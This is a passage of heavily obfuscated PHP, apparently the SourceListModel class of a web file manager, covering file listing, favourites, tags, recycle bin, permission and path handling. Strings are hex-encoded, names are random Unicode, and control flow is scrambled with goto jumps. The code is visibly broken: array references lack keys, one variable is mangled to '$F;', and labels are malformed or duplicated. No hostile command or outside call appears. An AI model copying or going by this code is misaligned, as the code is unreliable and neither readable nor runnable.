(isset($fܧ[$Eђ֧[1759]])) { if ($fܧ[$Eђ֧[1759]]) { $fܧ[$Eђ֧[1751]] = array($Eђ֧[987], intval($fܧ[$Eђ֧[1759]])); } unset($fܧ[$Eђ֧[1759]]); } return $this->_listData($fܧ); } private function _listData($dڏ) { $dȱӮ =& $_SERVER[]; $bˢ늶 = $this->where($dڏ)->_makeOrder()->selectPage(100); $this->_listAppendParent($bˢ늶[$dȱӮ[367]]); $this->_listAppendUser($bˢ늶[$dȱӮ[367]]); $this->_listAppendMeta($bˢ늶[$dȱӮ[367]]); return $bˢ늶; } private function _makeOrder() { $dʝ =& $_SERVER[]; $F۰ = array($dʝ[1746], $dʝ[1745], $dʝ[194]); $A = Input::get($dʝ[449], $dʝ[7], $dʝ[418], $F۰); $eܹ = Input::get($dʝ[450], $dʝ[7], $dʝ[1539], array($dʝ[1760], $dʝ[445])); $b̜ = $A . $dʝ[50] . $eܹ; return $this->order($b̜); } private function _listAppendParent(&$D) { goto Cֵɏ; Cֵɏ: $bƛ =& $_SERVER[]; $Fӆ = array_unique(array_to_keyvalue($D, $bƛ[33], $bƛ[1743])); $Fӆ = array_remove_value($Fӆ, $bƛ[191]); goto Aɨ; Aɨ: if (!$Fӆ) { return; } $Bը̈́ = $this->where(array($bƛ[1744] => array($bƛ[7], $Fӆ)))->select(); $Bը̈́ = array_to_keyvalue($Bը̈́, $bƛ[1751]); goto eȈ; eȈ: foreach ($D as &$a΍) { if (isset($Bը̈́[$a΍[$bƛ[1743]]])) { $a΍[$bƛ[1761]] = $Bը̈́[$a΍[$bƛ[1743]]]; } } unset($a΍); goto Bڎۖڲ; Bڎۖڲ: } private function _listAppendUser(&$fƆι) { goto eĲ; D䦻: foreach ($fƆι as &$Aʲ) { $Aʲ[$f[588]] = $E[$Aʲ[$f[1546]]]; if (isset($Aʲ[$f[1761]])) { $Aʲ[$f[1761]][$f[588]] = $E[$Aʲ[$f[1761]][$f[1546]]]; } } unset($Aʲ); goto b; eĲ: $f =& $_SERVER[]; $f = array_unique(array_to_keyvalue($fƆι, $f[33], $f[1546])); $f = array_remove_value($f, $f[191]); goto c; c: if (count($f) == 0) { return; } foreach ($fƆι as $Aʲ) { if (isset($Aʲ[$f[1761]])) { $f[] = $Aʲ[$f[1761]][$f[1546]]; } } $E = Model($f[532])->userListInfo($f); goto D䦻; b: } private function _listAppendMeta(&$Dߟ) { goto dΏ; dΏ: $eɑڠ =& $_SERVER[]; $C = array_unique(array_to_keyvalue($Dߟ, $eɑڠ[33], $eɑڠ[1751])); $C = array_remove_value($C, $eɑڠ[191]); goto DτІ; DτІ: if (!$C) { return; } foreach ($Dߟ as $d) { if (isset($d[$eɑڠ[1761]])) { $C[] = $d[$eɑڠ[1761]][$eɑڠ[1751]]; } } $DǪ = $this->metaList($C); goto E包; E包: if (!$DǪ) { return !1; } foreach ($Dߟ as &$d) { $d[$eɑڠ[459]] = $DǪ[$d[$eɑڠ[1751]]]; if (isset($d[$eɑڠ[1761]])) { $d[$eɑڠ[1761]][$eɑڠ[459]] = $DǪ[$d[$eɑڠ[1761]][$eɑڠ[1751]]]; } } unset($d); goto E; E: } private function metaList($bƱܐ) { goto a; A䶦: $Fᴥԝ = Model($dԮ[1762])->where($bۏ)->select(); $Fᴥԝ = array_to_keyvalue_group($Fᴥԝ, $dԮ[1751]); foreach ($Fᴥԝ as $E߇铜 => $dѮ) { $C = array(); foreach ($dѮ as $b) { $C[$b[$dԮ[93]]] = $b[$dԮ[372]]; } $Fᴥԝ[$E߇铜] = $C; } goto Eʌ; Eʌ: return $Fᴥԝ ? $Fᴥԝ : array(); goto F; a: $dԮ =& $_SERVER[]; if (!$bƱܐ) { return array(); } $bۏ = array($dԮ[1751] => array($dԮ[7], $bƱܐ)); goto A䶦; F: } } goto B򺥂; Eλױ: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\165\x72\x63\x65"; protected $tableMeta = array("\x74\x61\142\154\x65\116\x61\155\x65" => "\151\157\x5f\x73\x6f\x75\162\x63\145\x5f\x6d\145\x74\141", "\x6d\x65\x74\141\x46\x69\145\154\x64" => "\163\x6f\165\162\x63\x65\111\104"); protected $dataAuto = array(array("\155\x6f\144\151\x66\171\x54\x69\x6d\x65", "\164\x69\155\x65", "\x69\x6e\163\145\x72\x74", "\x66\x75\x6e\143\x74\x69\157\x6e"), array("\x63\162\x65\141\164\x65\x54\151\x6d\145", "\164\x69\x6d\145", "\x69\x6e\163\145\162\x74", "\x66\165\156\x63\164\151\157\x6e"), array("\166\x69\145\167\x54\x69\x6d\145", "\x74\151\x6d\145", "\x69\156\163\x65\x72\x74", "\x66\165\156\143\164\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($CǑ) { return $this->listSource(array($_SERVER[][396] => $CǑ)); } public function typeName($e) { static $DÛ⭬ = array(self::TYPE_SYSTEM => "\163\x79\x73\164\145\155", self::TYPE_USER => "\165\x73\145\162", self::TYPE_GROUP => "\x67\x72\x6f\x75\160"); return $DÛ⭬[$e . $_SERVER[][33]]; } public function sourceListInfo($c⩜, $ał = false) { goto cɏ; BѤ: if (!$c⩜) { return array(); } $A툚 = $this->where(array($c[397] => array($c[7], $c⩜)))->select(); $this->_listDataApply($A툚, $ał); goto cү; cү: return array_to_keyvalue($A툚, $c[397]); goto c܋; cɏ: $c =& $_SERVER[]; $c⩜ = $c⩜ ? $c⩜ : array(); $c⩜ = array_filter(array_unique($c⩜)); goto BѤ; c܋: } public function pathInfoFilter(&$D) { goto d; E󧋋: if ($D[$F򣏗[405]] != 1) { $D[$F򣏗[168]] = $D[$F򣏗[407]]; unset($D[$F򣏗[407]]); } $eǷ = $c; if (isset($D[$F򣏗[408]]) && $D[$F򣏗[408]][$F򣏗[409]] == -1) { $eǷ = $c΃΍ҋ; } goto d捅; E뗸: static $b = false; if (!$c) { goto e͵; e͵: $A = $F򣏗[398]; $A .= $F򣏗[399]; $A .= $F򣏗[400]; goto B; f: $c΃΍ҋ = array(); foreach ($c as $a߿Ȏ) { if (in_array($a߿Ȏ, $c֏ά)) { continue; } $c΃΍ҋ[] = $a߿Ȏ; } $b = explode($F򣏗[47], $F򣏗[402]); goto cش; B: $dϲ = $F򣏗[401]; $c֏ά = explode($F򣏗[47], $dϲ); $c = explode($F򣏗[47], $A); goto f; cش: } foreach ($b as $D튋) { if (isset($D[$D튋])) { $D[$D튋] = intval($D[$D튋]); } } goto E܄ј; d捅: $D = array_field_key($D, $eǷ); return $D; goto dˌ; E܄ј: $D[$F򣏗[76]] = $F򣏗[403] . $D[$F򣏗[397]] . $F򣏗[404]; $D[$F򣏗[29]] = $D[$F򣏗[405]] == 1 ? $F򣏗[77] : $F򣏗[193]; $D[$F򣏗[406]] = $this->typeName($D[$F򣏗[406]]); goto E󧋋; d: $F򣏗 =& $_SERVER[]; static $c = false; static $c΃΍ҋ = false; goto E뗸; dˌ: } public function listUserFav() { goto AÖ; aǤ: foreach ($eҨ܏ as &$c) { $c = array($eΑ[414] => $c[$eΑ[395]], $eΑ[415] => $c[$eΑ[28]], $eΑ[416] => $c[$eΑ[76]], $eΑ[417] => $c[$eΑ[29]], $eΑ[418] => $c[$eΑ[194]], $eΑ[419] => $c[$eΑ[84]]); if ($c[$eΑ[29]] == $eΑ[411] && $a[$c[$eΑ[76]]]) { $c[$eΑ[85]] = $a[$c[$eΑ[76]]]; } } unset($c); return $eҨ܏; goto a߬ς; AÖ: $eΑ =& $_SERVER[]; $eҨ܏ = Model($eΑ[410])->listData(); $B = array_filter_by_field($eҨ܏, $eΑ[29], $eΑ[411]); goto A㺐; A㺐: $B = array_to_keyvalue($B, $eΑ[33], $eΑ[76]); if ($B) { $a = $this->listSource(array($eΑ[412] => array($eΑ[413], $B))); } $a = array_to_keyvalue($a[$eΑ[367]], $eΑ[397]); goto aǤ; a߬ς: } public function listUserTag($D) { goto e; Dѵ: foreach ($fՙص as $b => $Eܯ) { $Dǒ = !0; if (!$D) { $B᳾[] = $b; continue; } foreach ($D as $Bޠݍ) { if (!in_array($Bޠݍ, $Eܯ)) { $Dǒ = !1; break; } } if ($Dǒ) { $B᳾[] = $b; } } if (!$B᳾) { return array(); } $Fͣ = $this->listSource(array($b䈶[412] => array($b䈶[413], $B᳾))); goto A; e: $b䈶 =& $_SERVER[]; if ($D && !is_array($D)) { $D = array($D); } $CܟȂ = Model($b䈶[420])->listData(); goto C; b: if ($dҷ) { Model($b䈶[422])->removeBySource($dҷ); } return $Fͣ; goto b; C: $fՙص = array(); foreach ($CܟȂ as $aζ) { $a = $aζ[$b䈶[76]]; if (!$a) { continue; } if (!isset($fՙص[$a])) { $fՙص[$a] = array(); } $fՙص[$a][] = $aζ[$b䈶[421]]; } $B᳾ = array(); goto Dѵ; A: if (!$Fͣ || count($B᳾) == $Fͣ[$b䈶[364]][$b䈶[365]]) { return $Fͣ; } $dҷ = array(); $Bƪ = array_to_keyvalue($Fͣ[$b䈶[75]], $b䈶[33], $b䈶[397]); goto aҐ; aҐ: $aɐ = array_to_keyvalue($Fͣ[$b䈶[74]], $b䈶[33], $b䈶[397]); $A֢ = array_merge($aɐ, $Bƪ); foreach ($B᳾ as $a) { if (!in_array($a, $A֢)) { $dҷ[] = $a; } } goto b; b: } public function listUserRecycle() { $dڂ߅ =& $_SERVER[]; $e٨з = Model($dڂ߅[423])->listData(); if (!$e٨з) { return array(); } $E = array($dڂ߅[412] => array($dڂ߅[413], $e٨з), $dڂ߅[424] => 1); return $this->listSource($E); } public function listSource($dӟ, $Fޗ = 3000) { goto d; e娾: $this->_listMake($bِܐ); return $bِܐ; goto fέ판; eʙ: $bِܐ = $this->field($A)->_makeOrder()->where($dӟ)->selectPage($Fޗ); $this->_listPageCheck($bِܐ, $A, $dӟ); $this->_listDataApply($bِܐ[$b枍[367]]); goto e娾; d: $b枍 =& $_SERVER[]; if (!isset($dӟ[$b枍[425]])) { $dӟ[$b枍[425]] = 0; } $A = $b枍[426]; goto eʙ; fέ판: } private function _listPageCheck(&$cǏￇ, $A桽, $aڃ) { goto b膐; d: foreach ($aڃ as $C => $Bۢȅ䠕) { $d٣[$bćȲ[430] . $C] = $Bۢȅ䠕; } $this->alias($bćȲ[438])->field($A桽)->limit($Dά)->order($C̔); $DĐ = $this->join($a춉)->where($d٣)->select(); goto a֯; b膐: $bćȲ =& $_SERVER[]; if (!is_array($cǏￇ[$bćȲ[364]])) { return; } $c͵ = $cǏￇ[$bćȲ[364]]; goto e; a֯: if ($DĐ) { $cǏￇ[$bćȲ[367]] = $DĐ; } goto EÉ; f쓹: $A桽 = str_replace(array($bćȲ[50], $bćȲ[340], $bćȲ[229]), $bćȲ[33], $A桽); $A桽 = $bćȲ[430] . str_replace($bćȲ[47], $bćȲ[431], $A桽) . $bćȲ[432]; $a춉 = $bćȲ[433]; goto cݷ; e: if ($c͵[$bćȲ[366]] <= 1) { return; } if ($c͵[$bćȲ[365]] >= 100000) { return; } if (Model($bćȲ[427])->get($bćȲ[428]) != $bćȲ[429]) { return; } goto f쓹; cݷ: $a춉 = $a춉 . $bćȲ[434]; $Dά = $c͵[$bćȲ[361]] * ($c͵[$bćȲ[351]] - 1) . $bćȲ[47] . $c͵[$bćȲ[361]]; $Fυ = $this->_makeOrder(!0); goto A; A: $C̔ = $bćȲ[430] . str_replace($bćȲ[47], $bćȲ[431], $Fυ[0]); if (strpos($C̔, $bćȲ[435])) { $C̔ = str_replace($bćȲ[435], $bćȲ[436], $C̔); } else { $C̔ .= $bćȲ[437] . $Fυ[1]; } $d٣ = array(); goto d; EÉ: } protected function _makeOrder($EӳØ = false) { goto E; E: $a =& $_SERVER[]; $dΦ߳ = Model($a[439])->get($a[440]); $A = Model($a[439])->get($a[441]); goto D; D: $f꒟ = array($a[442] => $a[443], $a[444] => $a[445]); $E鍜 = array($a[28] => $a[28], $a[78] => $a[78], $a[168] => $a[407], $a[446] => $a[446], $a[447] => $a[448], $a[194] => $a[194], $a[84] => $a[84]); $c = Input::get($a[449], $a[7], $dΦ߳, array_keys($E鍜)); goto f˴; f˴: $bܬ = Input::get($a[450], $a[7], $A, array_keys($f꒟)); if (!in_array($c, array_keys($E鍜))) { $c = $a[28]; } if (!in_array($bܬ, array_keys($f꒟))) { $c = $a[442]; } goto e栜; e栜: if ($c == $a[28]) { } $cӫջ = $a[451] . $E鍜[$c] . $a[50] . $f꒟[$bܬ]; $cӫջ = rtrim(trim($cӫջ), $a[47]); goto E; E: if ($EӳØ) { return array($cӫջ, $f꒟[$bܬ]); } return $this->order($cӫջ); goto Dܿˎ; Dܿˎ: } protected function _listDataApplyItem($d, $EȾΐ = false) { $a⸵ = array($d); $this->_listDataApply($a⸵, $EȾΐ); return $a⸵[0]; } protected function _listDataApply(&$F;, $BЄý = false) { goto Fϭζ; Fϭζ: $d˒ =& $_SERVER[]; if (!$F;) { $F; = array(); return; } $DŦ = array_to_keyvalue($F;, $d˒[33], $d˒[397]); goto a߫; C𷿴: $this->_listAppendPath($F;); $this->_listAppendAuth($F;); $this->_listAppendSourceInfo($F;, $DŦ); goto C٘; C٘: $this->_listAppendUser($F;); $this->_listFilterInfo($F;, $BЄý); $this->_listAppendAuthSecret($F;); goto bϪ; a߫: $DŦ = array_unique($DŦ); $this->_listSourceCache($F;); if (!$BЄý) { $this->_listAppendMeta($F;, $DŦ); $this->_listAppendFileMeta($F;, $DŦ); $this->_listAppendChildren($F;, $DŦ); } goto C𷿴; bϪ: } protected function _listSourceCache($f罹؉) { $a =& $_SERVER[]; foreach ($f罹؉ as $DԌ) { self::$cacheSourceInfo[$a[452] . $DԌ[$a[397]]] = $DԌ; } } protected function _listFilterInfo(&$E, $F = false) { $b =& $_SERVER[]; foreach ($E as &$Dׂʝ) { $Dׂʝ = $this->pathInfoFilter($Dׂʝ); self::$cachePathInfo[$b[453] . intval($F) . $b[454] . $Dׂʝ[$b[397]]] = $Dׂʝ; } unset($Dׂʝ); } protected function _listMake(&$cŚ) { $e =& $_SERVER[]; $cŚ[$e[75]] = array(); $cŚ[$e[74]] = array(); foreach ($cŚ[$e[367]] as $aӾ) { $C = $aӾ[$e[405]] == 1 ? $e[75] : $e[74]; $cŚ[$C][] = $aӾ; } unset($cŚ[$e[367]]); } protected function _listAppendMeta(&$BЏ, $f΂화) { goto eϋ׈; B՜: if (!$bٔ) { return; } $FؿЪ = array($F勺[457], $F勺[458], $F勺[436]); $aӕ = array(); goto C־·; eϋ׈: $F勺 =& $_SERVER[]; $B = array($F勺[412] => array($F勺[413], $f΂화)); $bٔ = Model($F勺[455])->field($F勺[456])->where($B)->select(); goto B՜; C־·: foreach ($bٔ as $fɧፃ) { if (!isset($aӕ[$fɧፃ[$F勺[397]]])) { $aӕ[$fɧፃ[$F勺[397]]] = array(); } if (in_array($fɧፃ[$F勺[93]], $FؿЪ)) { continue; } $aӕ[$fɧፃ[$F勺[397]]][$fɧፃ[$F勺[93]]] = $fɧፃ[$F勺[372]]; } foreach ($BЏ as &$bېݽ) { $bېݽ[$F勺[459]] = !1; if (isset($aӕ[$bېݽ[$F勺[397]]])) { $bېݽ[$F勺[459]] = $aӕ[$bېݽ[$F勺[397]]]; } if ($this->fileIsLock($bېݽ) && $bېݽ[$F勺[408]]) { $Cο߆⨿ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $bېݽ[$F勺[408]][$F勺[409]] = AuthModel::authDisable($bېݽ[$F勺[408]][$F勺[409]], $Cο߆⨿); $bېݽ[$F勺[408]][$F勺[460]][$F勺[408]] = $bېݽ[$F勺[408]][$F勺[409]]; } } unset($bېݽ); goto a; a: } protected function _listAppendFileMeta(&$eƭ, $D) { goto Fܐ; fֆ: $f = $f ? $f : array(); $B۷Ԇ = array(); foreach ($f as $D) { if (!isset($B۷Ԇ[$D[$Eʤ[461]]])) { $B۷Ԇ[$D[$Eʤ[461]]] = array(); } $B۷Ԇ[$D[$Eʤ[461]]][$D[$Eʤ[93]]] = $D[$Eʤ[372]]; } goto dƟ; bʄ䎍: $Bȟ = Model($Eʤ[464])->field($Å)->where($eϔ)->select(); $Bȟ = array_to_keyvalue($Bȟ, $Eʤ[461]); $f = Model($Eʤ[465])->field($Eʤ[466])->where($eϔ)->select(); goto fֆ; dƟ: foreach ($eƭ as &$A) { goto D; D: $e÷ޡ = $A[$Eʤ[461]]; if (!$e÷ޡ || !is_array($Bȟ[$e÷ޡ])) { continue; } $BԎд = $Bȟ[$e÷ޡ]; goto a; A󍃅: if (isset($A[$Eʤ[164]][$Eʤ[163]])) { $A[$Eʤ[163]] = json_decode($A[$Eʤ[164]][$Eʤ[163]], !0); unset($A[$Eʤ[164]][$Eʤ[163]]); } goto Cߴ; a: $BԎд[$Eʤ[78]] = $A[$Eʤ[78]]; $BԎд[$Eʤ[28]] = $A[$Eʤ[28]]; if (!isset(self::$cacheFileInfo[$Eʤ[467] . $e÷ޡ])) { self::$cacheFileInfo[$Eʤ[467] . $e÷ޡ] = array_merge(array(), $BԎд); } goto CȨЇ; CȨЇ: unset($Bȟ[$e÷ޡ][$Eʤ[76]]); $D = is_array($B۷Ԇ[$e÷ޡ]) ? $B۷Ԇ[$e÷ޡ] : array(); $A[$Eʤ[164]] = array_merge($D, $Bȟ[$e÷ޡ]); goto A󍃅; Cߴ: } unset($A); goto E; e҄: if (!$F) { return; } $eϔ = array($Eʤ[462] => array($Eʤ[413], $F)); $Å = $Eʤ[463]; goto bʄ䎍; Fܐ: $Eʤ =& $_SERVER[]; $F = array_to_keyvalue($eƭ, $Eʤ[33], $Eʤ[461]); $F = array_filter(array_unique($F)); goto e҄; E: } protected function _listAppendSourceInfo(&$D, $fԾ) { goto b; ańѩ: $Dħ = array_to_keyvalue_group($B왽, $b捭[397]); foreach ($D as &$A·) { $A·[$b捭[85]] = array($b捭[471] => 0, $b捭[472] => 0, $b捭[473] => 0); if (isset($B׾ɶ[$A·[$b捭[397]]])) { $A·[$b捭[85]][$b捭[474]] = 1; $A·[$b捭[85]][$b捭[475]] = $B׾ɶ[$A·[$b捭[397]]][$b捭[28]]; } if (isset($Fɚڃ[$A·[$b捭[397]]])) { $A·[$b捭[85]][$b捭[476]] = array(); foreach ($Fɚڃ[$A·[$b捭[397]]] as $cժ) { $a = $Dł[$cժ]; $A·[$b捭[85]][$b捭[476]][] = array($b捭[477] => $a[$b捭[395]], $b捭[415] => $a[$b捭[28]], $b捭[478] => $a[$b捭[479]]); } } if (isset($Dħ[$A·[$b捭[397]]])) { $A·[$b捭[85]][$b捭[480]] = array(); foreach ($Dħ[$A·[$b捭[397]]] as $bƊ) { $A·[$b捭[85]][$b捭[480]] = array($b捭[481] => $bƊ[$b捭[482]], $b捭[483] => $bƊ[$b捭[484]], $b捭[485] => $bƊ[$b捭[397]], $b捭[486] => $bƊ[$b捭[487]], $b捭[488] => $bƊ[$b捭[489]], $b捭[490] => $bƊ[$b捭[490]], $b捭[491] => $bƊ[$b捭[491]]); } } } unset($A·); goto f욽ٶ; f욽ٶ: return $D; goto Eَ; a꣣: $c = Model($b捭[420])->listData(); $B٣ = Model($b捭[410])->listData(); $B왽 = Model($b捭[470])->listSimple(); goto e; e: $Dł = array_to_keyvalue($D싐, $b捭[395]); $Fɚڃ = array_to_keyvalue_group($c, $b捭[76], $b捭[421]); $B׾ɶ = array_to_keyvalue($B٣, $b捭[76]); goto ańѩ; b: $b捭 =& $_SERVER[]; if (!defined($b捭[468])) { return; } $D싐 = Model($b捭[469])->listData(); goto a꣣; Eَ: } protected function _listAppendChildren(&$C, $dɧ) { goto B΍; B΍: $EƩȘ =& $_SERVER[]; $C󨆇 = array(); $cϻ찄 = array($EƩȘ[203] => 0, $EƩȘ[204] => 0); goto dٻ; Bߙ: $Bذ꾅 = array($EƩȘ[492] => array($EƩȘ[7], $C󨆇)); $fҔ = array($EƩȘ[492], $EƩȘ[405], $EƩȘ[493] => $EƩȘ[494]); $Dهژ = $this->field($fҔ)->where($Bذ꾅)->group($EƩȘ[495])->select(); goto dђ; bƷ: unset($c̿); goto c̎; dٻ: foreach ($C as &$c̿) { if (!$c̿[$EƩȘ[405]]) { continue; } $C󨆇[] = $c̿[$EƩȘ[397]]; } unset($c̿); if (!$C󨆇) { return; } goto Bߙ; dђ: $Aݯ = array(); foreach ($Dهژ as $d︳) { $D = $d︳[$EƩȘ[492]]; $Dʓ = $d︳[$EƩȘ[405]] == $EƩȘ[87] ? $EƩȘ[204] : $EƩȘ[203]; if (!isset($Aݯ[$D])) { $Aݯ[$D] = array($EƩȘ[203] => 0, $EƩȘ[204] => 0); } $Aݯ[$D][$Dʓ] += $d︳[$EƩȘ[494]]; } foreach ($C as &$c̿) { if (!$c̿[$EƩȘ[405]]) { continue; } $D = is_array($Aݯ[$c̿[$EƩȘ[397]]]) ? $Aݯ[$c̿[$EƩȘ[397]]] : $cϻ찄; $c̿[$EƩȘ[204]] = $D[$EƩȘ[204]]; $c̿[$EƩȘ[203]] = $D[$EƩȘ[203]]; unset($c̿[$EƩȘ[407]]); } goto bƷ; c̎: } protected function _listAppendAuth(&$d뿍) { goto a; a: $B =& $_SERVER[]; if (!defined($B[468])) { return; } $aѭĂ = array(); goto D랅; D랅: foreach ($d뿍 as $F݈) { if ($F݈[$B[406]] == self::TYPE_GROUP) { $aѭĂ[] = $F݈[$B[397]]; } } if (!$aѭĂ) { return; } $eͯ = array_to_keyvalue($d뿍, $B[397]); goto Bǜ; Bǜ: $eƴ = Model($B[496])->getSourceList($aѭĂ, $eͯ); foreach ($d뿍 as $bﶶ => &$F݈) { $F݈[$B[408]] = $eƴ[$F݈[$B[397]]]; if (!$F݈[$B[408]] && $F݈[$B[406]] == self::TYPE_GROUP) { $F݈[$B[408]] = Action($B[497])->pathGroupAuthMake($F݈[$B[498]]); if (!$F݈[$B[408]] && !_get($GLOBALS, $B[499])) { $F݈[$B[196]] = !1; $F݈[$B[195]] = !1; } } if ($F݈[$B[408]]) { $F݈[$B[196]] = AuthModel::authCheckEdit($F݈[$B[408]][$B[409]]); $F݈[$B[195]] = AuthModel::authCheckView($F݈[$B[408]][$B[409]]); } $this->groupPathDisplay($F݈); } unset($F݈); goto dù; dù: } public function _listAppendAuthSecret(&$d愐) { goto Eζ; Eζ: $a =& $_SERVER[]; if (Model($a[427])->get($a[500]) != $a[87]) { return; } static $Bꋙ׭ = false; goto f; cۉ: $Dǔ = $this->_listAppendPath($e߱, !0); foreach ($d愐 as $B䂋牷 => &$Bƺ) { if (!is_array($Bƺ[$a[408]])) { continue; } if ($Bƺ[$a[406]] != $a[509]) { continue; } if (isset($Bꋙ׭[$Bƺ[$a[397]]])) { goto e; f䥠: if ($bϣ[$a[446]] != $cƢ) { $Bƺ[$a[408]][$a[409]] = $Bƺ[$a[408]][$a[409]] & $bϣ[$a[408]][$a[408]]; } continue; goto AŇﺚ; Bּ: $Bƺ[$a[408]][$a[511]] = $bϣ; $Bƺ[$a[408]][$a[512]] = $Bƺ[$a[513]]; $Bƺ[$a[408]][$a[514]] = $a[87]; goto f䥠; e: $bϣ = $Bꋙ׭[$Bƺ[$a[397]]]; if (!is_array($Bƺ[$a[459]])) { $Bƺ[$a[459]] = array(); } $Bƺ[$a[459]][$a[510]] = $bϣ[$a[504]]; goto Bּ; AŇﺚ: } $DΑ = $this->parentLevelArray($Bƺ[$a[515]]); $f = array_reverse($DΑ); foreach ($f as $a => $c͐) { goto fɞХ; C: for ($b = 0; $b < $a˟; $b++) { if (!isset($Dǔ[$DΑ[$b]])) { $B،ń = $a[33]; break; } $B،ń = $B،ń . rtrim($Dǔ[$DΑ[$b]], $a[8]) . $a[8]; } $Bƺ[$a[408]][$a[512]] = rtrim($B،ń, $a[8]) . $a[8]; break; goto dԮʸ; Aե: if ($bϣ[$a[446]] != $cƢ) { $Bƺ[$a[408]][$a[409]] = $Bƺ[$a[408]][$a[409]] & $bϣ[$a[408]][$a[408]]; } $B،ń = $a[33]; $a˟ = count($DΑ) - $a; goto C; fɞХ: if (!isset($Bꋙ׭[$c͐])) { continue; } $bϣ = $Bꋙ׭[$c͐]; $Bƺ[$a[408]][$a[511]] = $bϣ; goto Aե; dԮʸ: } } unset($Bƺ); goto EŨΨ۩; f: if (!$Bꋙ׭) { goto d֖; CЪ: foreach ($Bꋙ׭ as $B䂋牷 => $Bƺ) { goto A߹; A򿺃: $Bƺ[$a[506]] = Model($a[507])->getInfoSimpleOuter($Bƺ[$a[446]]); $Bꋙ׭[$B䂋牷] = $Bƺ; goto B슺; B郎: if (!$F񤊜) { $b->remove($Bƺ[$a[395]]); unset($Bꋙ׭[$B䂋牷]); continue; } $Bƺ[$a[408]] = $F񤊜; $Bƺ[$a[505]] = $D; goto A򿺃; A߹: $D = $DΉ[$Bƺ[$a[504]]]; if (!$D) { $b->remove($Bƺ[$a[395]]); unset($Bꋙ׭[$B䂋牷]); continue; } $F񤊜 = $e->listData($D[$a[408]]); goto B郎; B슺: } goto A̫; B֎: $Bꋙ׭ = array_to_keyvalue($Bꋙ׭, $a[397]); $DΉ = json_decode(Model($a[427])->get($a[503]), !0); $DΉ = array_to_keyvalue($DΉ, $a[395]); goto CЪ; d֖: $e = Model($a[501]); $b = Model($a[502]); $Bꋙ׭ = $b->listData(); goto B֎; A̫: } $cƢ = defined($a[508]) ? USER_ID : $a[33]; $e߱ = array(); goto cۉ; EŨΨ۩: } public function groupPathDisplay(&$D˔Ԉ) { goto c; f͡ڐ: $e = $this->parentLevelArray($B撡˚[$Aݼ[515]]); $b = $Aݼ[33]; foreach ($e as $Cڏ) { $a = Model($Aݼ[516])->getInfo($Cڏ); $b .= $a[$Aݼ[85]][$Aݼ[397]] . $Aݼ[47]; } goto fϝ; F: $D˔Ԉ[$Aݼ[521]] = $b . $B撡˚[$Aݼ[85]][$Aݼ[397]]; goto bѮ; fϝ: $D˔Ԉ[$Aݼ[517]] = $B撡˚[$Aݼ[492]]; $D˔Ԉ[$Aݼ[518]] = $B撡˚[$Aݼ[515]]; $D˔Ԉ[$Aݼ[519]] = $B撡˚[$Aݼ[520]]; goto F; c: $Aݼ =& $_SERVER[]; if ($D˔Ԉ[$Aݼ[406]] != self::TYPE_GROUP) { return; } $B撡˚ = Model($Aݼ[516])->getInfo($D˔Ԉ[$Aݼ[498]]); goto f͡ڐ; bѮ: } protected function _listAppendPath(&$eߏ, $A̅ = false) { goto b; b: $cۏ =& $_SERVER[]; static $Eʃ = array(); $b = array(); goto Cۦ; F: unset($Cڐ); $b = array_unique($b); if (count($b) > 0) { $D쬒 = array($cۏ[412] => array($cۏ[413], $b)); if (count($b) == 1) { $dɼ = $this->sourceInfo($b[0]); $b = is_array($dɼ) ? array($dɼ) : !1; } else { $b = $this->field($cۏ[522])->where($D쬒)->select(); } if (!$b) { $b = array(); } foreach ($b as $B⮡) { $Eʃ[$B⮡[$cۏ[397]]] = $B⮡[$cۏ[28]]; } } goto c Ǆ; c Ǆ: $dȈ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $dͽ䊠 = array(); foreach ($eߏ as &$Cڐ) { goto FŘ; FŘ: $cٲ = $Cڐ[$cۏ[515]]; $fڭ = $cۏ[33]; if (isset($dͽ䊠[$cٲ])) { $fڭ = $dͽ䊠[$cٲ]; } else { $bӟ = $this->parentLevelArray($Cڐ[$cۏ[515]]); foreach ($bӟ as $aώ => $D΄) { if (isset($Eʃ[$D΄])) { $fڭ .= $Eʃ[$D΄] . $cۏ[8]; } } $dͽ䊠[$cٲ] = $fڭ; } goto A; Cܗ: if ($Cڐ[$cۏ[492]] == $cۏ[191]) { $Cڐ[$cۏ[28]] = trim($Eʃ[$Cڐ[$cۏ[397]]], $cۏ[8]); $Cڐ[$cۏ[513]] = $Cڐ[$cۏ[28]] . $cۏ[8]; } if (intval($Cڐ[$cۏ[406]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Cڐ, $bӟ, $dȈ); } goto eÒ; A: $fڭ .= $Cڐ[$cۏ[28]]; if ($Cڐ[$cۏ[405]] == $cۏ[87]) { $fڭ .= $cۏ[8]; } $Cڐ[$cۏ[513]] = str_replace($cۏ[523], $cۏ[8], $fڭ); goto Cܗ; eÒ: } goto d񽈿ê; d񽈿ê: unset($Cڐ); return $eߏ; goto Cثᕲ; Cۦ: $D = array(); if ($A̅) { return $Eʃ; } foreach ($eߏ as &$Cڐ) { goto CΨǉ; f֒Ӫ: if (isset($D[$Cڐ[$cۏ[515]]])) { continue; } $D[$Cڐ[$cۏ[515]]] = !0; $bӟ = $this->parentLevelArray($Cڐ[$cۏ[515]]); goto c芆; CΨǉ: $C厅 = $Cڐ[$cۏ[397]]; if ($Cڐ[$cۏ[405]] == $cۏ[87] && $Cڐ[$cۏ[492]] != 0) { $Eʃ[$C厅] = $Cڐ[$cۏ[28]]; } if ($Cڐ[$cۏ[405]] == $cۏ[87] && $Cڐ[$cۏ[492]] == 0 && !isset($Eʃ[$C厅])) { $Eʃ[$C厅] = $this->_listAppendPathRoot($Cڐ, array()); } goto f֒Ӫ; c芆: foreach ($bӟ as $aώ => $D΄) { if (isset($Eʃ[$D΄])) { continue; } if ($aώ == 0) { $Eʃ[$D΄] = $this->_listAppendPathRoot($Cڐ, $bӟ); } if ($aώ != 0) { $b[] = $D΄; } } goto E䄌; E䄌: } goto F; Cثᕲ: } private function _listAppendPathRecycle(&$A, $fݸͲ, $C׆΂) { goto b܅; d: if ($A[$E[397]] == $C׆΂) { $A[$E[515]] = $E[525]; $A[$E[492]] = $E[191]; $A[$E[28]] = LNG($E[524]); } $A[$E[526]] = $E[527]; goto DՃ; b܅: $E =& 